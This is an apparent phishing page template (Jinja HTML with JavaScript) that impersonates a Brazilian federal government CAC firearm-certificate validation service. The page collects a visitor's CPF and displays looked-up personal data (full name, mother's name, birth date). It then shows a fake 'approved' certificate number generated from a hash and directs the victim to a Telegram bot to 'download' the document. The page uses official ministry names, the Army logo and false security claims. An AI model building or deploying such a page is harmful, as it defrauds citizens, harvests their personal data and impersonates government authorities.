{% extends "base.html" %}

{% block content %}
<main class="flex-grow container mx-auto px-4 py-8">
    <div id="consultaForm" class="bg-white shadow-md rounded-lg p-6">
        <div class="text-center mb-6">
            <h1 class="text-2xl font-bold text-military-green mb-2">GOVERNO FEDERAL DO BRASIL</h1>
            <h2 class="text-xl font-semibold text-military-dark mb-2">MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA</h2>
            <h3 class="text-lg font-bold text-military-green">SISTEMA NACIONAL DE ARMAS</h3>
            <h4 class="text-lg font-semibold text-military-dark">VALIDAÇÃO OFICIAL DE CERTIFICADO CAC</h4>
        </div>

        <div class="bg-military-green bg-opacity-10 p-4 rounded-lg mb-6">
            <h3 class="text-lg font-semibold text-military-dark mb-2">SISTEMA NACIONAL DE ARMAS - SINARM</h3>
            <h4 class="text-lg font-bold text-military-green mb-2">CAC - CERTIFICADO DE REGISTRO DE ARMA DE FOGO</h4>
            
            <p class="text-gray-700 mb-4">
                Bem-vindo ao sistema oficial de validação digital do Certificado de Registro CAC.
                Este assistente vai conduzi-lo pelo processo de validação e homologação digital do seu registro.
            </p>
            
            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
                <p class="text-yellow-700">
                    <strong>ATENÇÃO:</strong> Este é um procedimento oficial e seus dados serão tratados conforme a LGPD.
                </p>
            </div>
        </div>

        <form id="cpfForm" class="space-y-4">
            <div>
                <label for="cpf" class="block text-sm font-medium text-gray-700">Informe seu CPF para continuar:</label>
                <input type="text" id="cpf" name="cpf" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm focus:ring-military-green focus:border-military-green sm:text-sm" placeholder="000.000.000-00" required>
            </div>
            <button type="submit" class="w-full bg-gradient-to-b from-military-green to-military-dark text-white py-3 px-4 rounded-lg shadow-md hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-military-green font-medium transition duration-200 ease-in-out relative overflow-hidden group">
                <div class="flex items-center justify-center">
                    <i class="fas fa-check-circle mr-2"></i>
                    <span>INICIAR VALIDAÇÃO DIGITAL</span>
                </div>
            </button>
        </form>
    </div>

    <div id="certificadoAprovado" class="hidden max-w-3xl mx-auto bg-white shadow-lg rounded-lg overflow-hidden mt-8">
        <div class="bg-military-green text-white p-5 relative">
            <div class="absolute top-3 right-3 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full shadow-md flex items-center">
                <i class="fas fa-check-circle mr-1"></i> APROVADO
            </div>
            <div class="flex items-center">
                <img src="https://www.eb.mil.br/image/company_logo?img_id=40367" alt="Brasão do Exército Brasileiro" class="h-14 mr-3">
                <div>
                    <h1 class="text-2xl font-bold">Certificado CAC - Pronto para Download</h1>
                    <p id="parabensMensagem" class="text-lg">Parabéns! Seu certificado de CAC foi aprovado.</p>
                </div>
            </div>
        </div>
        
        <div class="p-5">
            <div class="mb-6 border border-gray-200 rounded-lg overflow-hidden">
                <div class="bg-gray-100 px-4 py-3 border-b border-gray-200">
                    <h2 class="text-xl font-semibold text-military-dark">Dados do Requerente</h2>
                </div>
                <div class="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <p class="text-gray-500 text-sm">CPF</p>
                        <p class="font-medium text-gray-800" id="resultCpf"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Nome Completo</p>
                        <p class="font-medium text-gray-800" id="resultNome"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Nome da Mãe</p>
                        <p class="font-medium text-gray-800" id="resultNomeMae"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Data de Nascimento</p>
                        <p class="font-medium text-gray-800" id="resultDataNascimento"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Sexo</p>
                        <p class="font-medium text-gray-800" id="resultSexo"></p>
                    </div>
                </div>
            </div>
            
            <div class="mb-6 border border-gray-200 rounded-lg overflow-hidden">
                <div class="bg-gray-100 px-4 py-3 border-b border-gray-200">
                    <h2 class="text-xl font-semibold text-military-dark">Informações do Documento</h2>
                </div>
                <div class="p-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <p class="text-gray-500 text-sm">Número do Certificado</p>
                        <p class="font-medium text-gray-800">CAC-<span id="certNumber"></span></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Data de Emissão</p>
                        <p class="font-medium text-gray-800" id="dataEmissao"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Validade</p>
                        <p class="font-medium text-gray-800" id="dataValidade"></p>
                    </div>
                    <div>
                        <p class="text-gray-500 text-sm">Região Militar</p>
                        <p class="font-medium text-gray-800">SFPC/<span id="regiaoMilitar"></span>ª RM</p>
                    </div>
                </div>
            </div>
            
            <div class="mt-8 bg-white rounded-lg shadow-lg overflow-hidden">
                <div class="p-6">
                    <h2 class="text-2xl font-bold text-military-green mb-4">PRÓXIMO PASSO</h2>
                    <h3 class="text-xl font-semibold text-military-dark mb-2">Baixe Seu Certificado no Telegram</h3>
                    <p class="text-gray-700 mb-4">O certificado está pronto para download instantâneo</p>
                    
                    <div class="text-center mb-5 max-w-md mx-auto">
                        <div class="mb-2 text-sm text-gray-600 font-medium">Para sua segurança, o documento oficial é disponibilizado via Telegram</div>
                        
                        <a href="https://t.me/validacaocac_bot" target="_blank" 
                           class="block bg-gradient-to-b from-military-green to-military-dark text-white font-bold 
                                  py-3 sm:py-4 px-5 rounded-lg shadow-lg border border-military-green border-opacity-20
                                  transition duration-200 ease-in-out hover:shadow-xl relative overflow-hidden group">
                            
                            <div class="flex items-center justify-center">
                                <div class="bg-white bg-opacity-10 rounded-full p-2 flex items-center justify-center mr-3">
                                    <i class="fab fa-telegram text-white text-2xl"></i>
                                </div>
                                
                                <div class="text-left flex-1">
                                    <span class="block text-xs uppercase tracking-wide text-blue-100">Documento Oficial</span>
                                    <span class="block text-lg sm:text-xl">Baixar Certificado</span>
                                </div>
                                
                                <div class="ml-2 bg-white bg-opacity-10 rounded-full w-7 h-7 flex items-center justify-center flex-shrink-0">
                                    <i class="fas fa-arrow-right text-white text-sm"></i>
                                </div>
                            </div>
                        </a>
                    </div>

                    <div class="mt-6">
                        <h4 class="text-lg font-semibold text-military-dark mb-2">Processo de Validação</h4>
                        <p class="text-gray-700 mb-2">1. Ao clicar no botão, você será redirecionado para o Telegram</p>
                        <p class="text-gray-700 mb-2">2. Digite seu CPF quando solicitado</p>
                        <p class="text-gray-700 mb-2">3. Siga as instruções do sistema para validação</p>
                        <p class="text-gray-700 mb-2">4. Seu certificado será enviado após a homologação</p>
                    </div>
                </div>
            </div>
            
            <div class="mt-8 border-t border-gray-200 pt-6 flex justify-center">
                <div class="text-center">
                    <div class="inline-flex items-center justify-center rounded-full bg-military-light bg-opacity-10 p-2 mb-2">
                        <i class="fas fa-shield-alt text-military-green text-xl"></i>
                    </div>
                    <p class="text-sm text-gray-600">Este documento é protegido por criptografia de grau militar.</p>
                    <p class="text-xs text-gray-500 mt-1">Verificado pelo Sistema de Gerenciamento Militar do Exército Brasileiro.</p>
                </div>
            </div>
        </div>
    </div>
</main>

<script>
document.getElementById('cpfForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
    
    try {
        const response = await fetch('/api/verify-cpf', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ cpf }),
        });
        
        const data = await response.json();
        
        if (data.status === 'approved') {
            // Preencher os dados do usuário
            document.getElementById('resultCpf').textContent = data.data.cpf;
            document.getElementById('resultNome').textContent = data.data.nome;
            document.getElementById('resultNomeMae').textContent = data.data.nomeMae;
            document.getElementById('resultDataNascimento').textContent = data.data.dataNascimento;
            document.getElementById('resultSexo').textContent = data.data.sexo;
            
            // Gerar número do certificado
            const now = new Date();
            const protocolBase = cpf.slice(0, 5);
            const hashValue = Math.abs(hashCode(cpf + data.data.nome));
            const sequential = String(hashValue % 10000).padStart(4, '0');
            const protocol = `CAC-${protocolBase}-${sequential}/${now.getFullYear()}`;
            
            document.getElementById('certNumber').textContent = protocol;
            document.getElementById('dataEmissao').textContent = now.toLocaleDateString('pt-BR');
            document.getElementById('dataValidade').textContent = new Date(now.setFullYear(now.getFullYear() + 5)).toLocaleDateString('pt-BR');
            document.getElementById('regiaoMilitar').textContent = '1';
            
            // Mostrar o certificado
            document.getElementById('consultaForm').classList.add('hidden');
            document.getElementById('certificadoAprovado').classList.remove('hidden');
        } else {
            alert(data.message || 'Erro ao verificar CPF');
        }
    } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao processar sua solicitação. Por favor, tente novamente.');
    }
});

function hashCode(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash;
}
</script>
{% endblock %}
